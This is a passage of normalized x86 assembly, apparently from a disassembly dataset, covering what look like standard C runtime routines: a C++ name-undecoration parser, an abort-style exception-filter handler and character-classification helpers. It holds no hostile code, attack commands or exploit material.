cmp [ ebp - 0x14 ] 0x0
lea ecx [ ebp - 0x14 ]
push eax
je r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
push edi
push eax
call sub_422dd8
mov ecx eax
call sub_422dfc
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x2
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0xc ]
call sub_4226d7
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_422b18
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
xor esi esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x14 ] esi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x34 ]
mov ecx [ ebp + 0x8 ]
call sub_422338
cmp [ ebp - 0x1c ] esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push edi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0xc ]
call sub_422dd8
mov ecx eax
call sub_422b18
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
test bl 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push edi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_422dd8
mov ecx eax
call sub_422b18
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ rwxdata ]
shr eax 0x1
not eax
test al 0x1
mov eax ebx
je r-xdata
cmp [ ebp + 0x18 ] esi
je r-xdata
and eax 0xc
cmp al 0xc
jne r-xdata
and eax 0xc
cmp al 0xc
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_4247cf
pop ecx
push eax
lea ecx [ ebp - 0xc ]
call sub_421f2b
cmp [ ebp + 0x18 ] esi
jne r-xdata
mov eax [ rwxdata ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x54 ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ rwxdata ]
add esp 0xc
cmp [ eax ] 0x0
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x54 ]
je r-xdata
test bl 0x1
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x54 ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_4247cf
pop ecx
mov ecx eax
call sub_422b18
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x1
lea ecx [ ebp - 0xc ]
call sub_422619
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_42561a
pop ecx
push eax
lea ecx [ ebp - 0xc ]
call sub_421f2b
push 0x1
push eax
call sub_422d90
add esp 0xc
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_42561a
pop ecx
mov ecx eax
call sub_422b18
jmp r-xdata
xor ebx ebx
mov esi 0x100
cmp [ ebp + 0x18 ] ebx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x54 ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
inc [ rwxdata ]
cmp al 0x40
jne r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
test al al
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
or ecx esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
jmp r-xdata
or ecx 0x2000
mov eax [ ebp + 0x14 ]
cmp [ eax ] ebx
je r-xdata
mov edx [ eax + 0x4 ]
test esi edx
jne r-xdata
push eax
lea eax [ ebp - 0x54 ]
push edi
push eax
call sub_422d6c
add esp 0xc
test edx 0x800
je r-xdata
mov ecx [ ebp + 0x14 ]
cmp [ ecx ] ebx
je r-xdata
mov ecx [ eax ]
mov eax edx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
push eax
lea eax [ ebp - 0x54 ]
push eax
push edi
lea eax [ ebp - 0x4c ]
push eax
push ecx
lea eax [ ebp - 0x44 ]
push edi
push eax
call sub_422d6c
add esp 0xc
mov ecx eax
call sub_422dd8
mov ecx eax
call sub_422b18
jmp r-xdata
push eax
lea ecx [ ebp - 0xc ]
call sub_422929
sub_4260a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp - 0x4 ]
mov edx 0xffff0000
and [ ebp - 0x4 ] edx
xor ecx ecx
and [ ebp - 0x8 ] ecx
and eax edx
mov edx [ rwxdata ]
test edx edx
je r-xdata
cmp al 0x3
jne r-xdata
cmp [ edx ] 0x3f
jne r-xdata
cmp al 0x2
je r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x18 ]
push eax
call sub_425402
pop ecx
mov al [ edx + 0x1 ]
cmp al 0x40
jne r-xdata
push [ rwxdata ]
lea ecx [ ebp - 0x8 ]
call sub_422a00
test [ rwxdata ] 0x1000
jne r-xdata
cmp al 0x24
jne r-xdata
add [ rwxdata ] 0x2
lea eax [ ebp - 0x10 ]
push eax
call sub_425402
push eax
lea eax [ ebp - 0x18 ]
push r--data
push eax
call sub_422db4
add esp 0x10
jmp r-xdata
push [ rwxdata ]
lea ecx [ ebp - 0x8 ]
push eax
call sub_42237d
mov eax [ rwxdata ]
mov edx eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ rwxdata ]
cmp [ edx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_42425d
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp al 0x2
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov cl [ eax ]
test cl cl
jne r-xdata
inc eax
mov [ rwxdata ] eax
add eax 0x7
and eax 0xfffffff8
push eax
call [ rwxdata ]
pop ecx
mov [ rwxdata ] eax
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax ]
mov eax [ rwxdata ]
test eax eax
jne r-xdata
mov eax [ rwxdata ]
mov [ rwxdata ] eax
cmp cl 0x20
jne r-xdata
mov al cl
mov [ edx ] al
mov eax [ rwxdata ]
leave
retn
mov [ edx ] cl
inc edx
inc eax
inc eax
mov [ edx ] cl
inc edx
jmp r-xdata
cmp [ eax ] 0x20
je r-xdata
inc eax
jmp r-xdata
sub_4261d6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
mov al [ eax ]
push ebx
xor ebx ebx
push esi
cmp al bl
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_422338
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
call sub_422b60
mov esi [ ebp + 0xc ]
cmp [ esi ] ebx
je r-xdata
cmp al 0x36
jl r-xdata
push edi
mov edi [ ebp + 0x10 ]
cmp [ edi ] ebx
je r-xdata
push esi
lea ecx [ ebp - 0x8 ]
call sub_422929
cmp al 0x5f
jne r-xdata
cmp al 0x39
jle r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
pop edi
cmp [ esi ] ebx
je r-xdata
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_425bde
xor eax eax
cmp [ ebp + 0x14 ] 0x2a
sete al
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_423a07
add esp 0x20
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
call sub_4226d7
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
cmp [ eax ] ebx
je r-xdata
push edi
lea ecx [ ebp - 0x8 ]
call sub_422929
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_422b60
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_42588a
pop ecx
pop ecx
push esi
lea ecx [ ebp - 0x8 ]
call sub_422929
push eax
lea ecx [ ebp - 0x8 ]
call sub_422929
test [ esi + 0x4 ] 0x100
jne r-xdata
sub_426326
push 0x64
push r--data
call sub_40e30c
mov edi [ ebp + 0x14 ]
xor esi esi
cmp edi esi
jne r-xdata
push 0x5
call sub_416026
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x5
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] esi
mov [ rwxdata ] edi
mov eax [ ebp + 0x18 ]
mov [ rwxdata ] eax
mov [ rwxdata ] esi
mov [ rwxdata ] esi
mov [ rwxdata ] esi
movzx eax [ ebp + 0x1c ]
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_4221bd
lea ecx [ ebp - 0x74 ]
call sub_4260a5
mov [ ebp - 0x1c ] eax
mov ecx rwxdata
call sub_42172a
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4263b7
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
sub_4263c0
push 0x64
push r--data
call sub_40e30c
mov edi [ ebp + 0x14 ]
xor esi esi
cmp edi esi
jne r-xdata
push 0x5
call sub_416026
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x5
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] esi
mov [ rwxdata ] edi
mov eax [ ebp + 0x18 ]
mov [ rwxdata ] eax
mov [ rwxdata ] esi
mov [ rwxdata ] esi
mov [ rwxdata ] esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_4221bd
lea ecx [ ebp - 0x74 ]
call sub_4260a5
mov [ ebp - 0x1c ] eax
mov ecx rwxdata
call sub_42172a
mov [ ebp - 0x4 ] 0xfffffffe
call sub_426451
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
sub_42645a
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
mov al [ eax ]
sub esp 0x24
push ebx
push esi
push edi
test al al
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_422d90
inc [ rwxdata ]
and [ ebp - 0xc ] 0x0
movzx edi al
mov esi 0xffff0000
and [ ebp - 0x8 ] esi
mov eax edi
or ebx 0xffffffff
cmp eax 0x4e
mov [ ebp - 0x1 ] 0x0
jg r-xdata
cmp eax 0x4f
je r-xdata
je r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_422a00
jle r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_422bb2
sub eax 0x43
cmp eax 0xa
ja r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax ]
and [ ebp - 0x8 ] esi
xor ecx ecx
mov [ ebp - 0x14 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] edx
cmp ebx 0xfffffffe
jne r-xdata
mov eax edi
sub eax 0x43
je r-xdata
lea eax [ ebp - 0x24 ]
jmp r-xdata
cmp eax 0x53
jle r-xdata
movzx eax [ eax + lookup_table_426806 ]
jmp [ eax * 4 + jump_table_4267ee ]
cmp [ eax ] ecx
jne r-xdata
push ecx
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
mov esi 0x800
or [ ebp - 0x10 ] esi
push eax
call sub_4261d6
add esp 0x10
test [ ebp - 0x18 ] esi
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push r--data
lea eax [ ebp - 0x14 ]
push 0x2
pop ecx
sub eax ecx
je r-xdata
dec [ rwxdata ]
push eax
call sub_42467e
mov edx [ eax + 0x4 ]
pop ecx
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
test ecx ecx
jne r-xdata
mov ebx edi
and ebx 0x3
jmp r-xdata
cmp eax 0x58
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_4262cf
jmp r-xdata
test bl 0x1
je r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x18 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x1c ]
call sub_422bb2
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
push 0x20
push eax
call sub_422d6c
add esp 0xc
push eax
lea ecx [ ebp - 0xc ]
call sub_422929
lea eax [ ebp - 0xc ]
push eax
push r--data
lea eax [ ebp - 0x1c ]
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
cmp ebx 0xffffffff
jne r-xdata
push r--data
cmp eax 0x5f
jne r-xdata
lea ecx [ ebp - 0xc ]
call sub_422a00
jmp r-xdata
add esp 0xc
test bl 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_422a00
test bl 0x2
je r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push eax
call sub_422db4
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
sub eax ecx
je r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
inc [ rwxdata ]
mov [ ebp - 0x1 ] al
movzx eax al
cmp eax 0x4b
jg r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_422a00
push r--data
lea ecx [ ebp - 0xc ]
call sub_422bb2
jmp r-xdata
sub eax ecx
je r-xdata
cmp eax 0x4c
jl r-xdata
cmp eax 0x4a
jge r-xdata
sub eax 0x14
jne r-xdata
push r--data
jmp r-xdata
cmp eax 0x4d
jle r-xdata
push r--data
jmp r-xdata
cmp eax 0x45
jg r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
sub eax 0x45
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x4e
je r-xdata
cmp eax 0x46
jl r-xdata
cmp eax 0x44
jge r-xdata
lea eax [ ebp - 0xc ]
push eax
push r--data
lea eax [ ebp - 0x24 ]
jmp r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x4f
je r-xdata
cmp eax 0x47
jle r-xdata
push r--data
jmp r-xdata
test eax eax
je r-xdata
sub eax ecx
je r-xdata
push 0xfffffffe
pop ebx
cmp eax 0x57
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x49
jg r-xdata
dec [ rwxdata ]
push 0x1
lea ecx [ ebp - 0xc ]
call sub_422461
jmp r-xdata
cmp eax 0x24
jne r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
add eax 0xffffffa8
cmp eax 0x1
ja r-xdata
push r--data
jmp r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_42645a
push eax
push r--data
push [ ebp + 0x8 ]
call sub_422db4
add esp 0x14
jmp r-xdata
sub eax ecx
jne r-xdata
lea eax [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
sub_426811
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov edx [ rwxdata ]
movsx eax [ edx ]
push ebx
xor ebx ebx
mov ecx 0xffff0000
and [ ebp - 0x4 ] ecx
sub eax ebx
push esi
mov [ ebp - 0x8 ] ebx
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_422d90
sub eax 0x24
je r-xdata
mov al [ edx + 0x1 ]
cmp al 0x24
je r-xdata
sub eax 0x1d
mov esi [ ebp + 0xc ]
je r-xdata
inc edx
inc edx
mov [ rwxdata ] edx
movsx eax [ edx ]
sub eax ebx
je r-xdata
cmp al bl
je r-xdata
mov eax [ esi ]
mov esi [ esi + 0x4 ]
inc [ rwxdata ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
or esi 0x100
mov [ ebp - 0xc ] esi
call sub_426309
jmp r-xdata
dec eax
je r-xdata
sub eax 0x41
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_422338
jmp r-xdata
add esp 0xc
push r--data
lea ecx [ ebp - 0x8 ]
call sub_422a00
cmp [ esi ] ebx
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_42645a
push [ ebp + 0xc ]
inc edx
push [ ebp + 0x8 ]
mov [ rwxdata ] edx
call sub_42588a
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
leave
retn
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_422b60
pop ecx
pop ecx
jmp r-xdata
push 0x1
push [ ebp + 0xc ]
inc edx
push [ ebp + 0x8 ]
mov [ rwxdata ] edx
call sub_423a07
jmp r-xdata
dec eax
jne r-xdata
and [ ebp - 0x4 ] ecx
push ebx
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
inc edx
push eax
mov [ rwxdata ] edx
mov [ ebp - 0x8 ] ebx
call sub_425bde
push eax
push [ ebp + 0x8 ]
call sub_42645a
add esp 0x1c
jmp r-xdata
sub_426949
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push [ ebp + 0xc ]
lea ecx [ ebp - 0x8 ]
call sub_4222e5
mov eax [ rwxdata ]
mov cl [ eax ]
xor eax eax
cmp cl al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_422d90
cmp cl 0x3f
je r-xdata
inc [ rwxdata ]
and [ ebp - 0xc ] 0xffff0000
push eax
lea ecx [ ebp - 0x10 ]
push ecx
push eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_425bde
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_426811
add esp 0x1c
jmp r-xdata
cmp cl 0x58
je r-xdata
mov eax [ ebp + 0x8 ]
leave
retn
inc [ rwxdata ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_426811
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push r--data
push [ ebp + 0x8 ]
call sub_422db4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_422704
jmp r-xdata
add esp 0xc
sub_426a09
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push esi
push 0x0
push 0x8
mov ecx rwxdata
call sub_421d93
test eax eax
je r-xdata
xor esi esi
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
mov esi eax
jmp r-xdata
push esi
push [ ebp + 0x8 ]
call sub_426949
lea eax [ ebp - 0x8 ]
push eax
call sub_42222c
add esp 0xc
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
push 0x20
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_422dd8
mov ecx eax
call sub_422b18
push eax
mov ecx esi
call sub_421f4a
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
sub_426a77
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rwxdata ] 0x1
push esi
je r-xdata
call sub_419950
test eax eax
je r-xdata
push 0xa
call sub_410da6
pop ecx
test [ rwxdata ] 0x2
je r-xdata
push 0x16
call sub_419bac
pop ecx
push 0x3
call sub_410d00
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_413d20
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_426b8e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rwxdata ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rwxdata ] ecx
pop ebp
retn
sub_426baf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x103
lea eax [ ebp - 0x10 ]
push eax
push 0x103
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_426c05
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_426baf
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x103
pop ebp
retn
sub_426c35
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_426c86
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_426c35
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_426cb4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_426d05
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_426cb4
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_426d33
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_426d84
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_426d33
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_426db2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_426e08
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_426db2
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_426e38
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_42842c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_426e89
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_426e38
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_426eb7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x10
lea eax [ ebp - 0x10 ]
push eax
push 0x10
push [ ebp + 0x8 ]
call sub_42842c
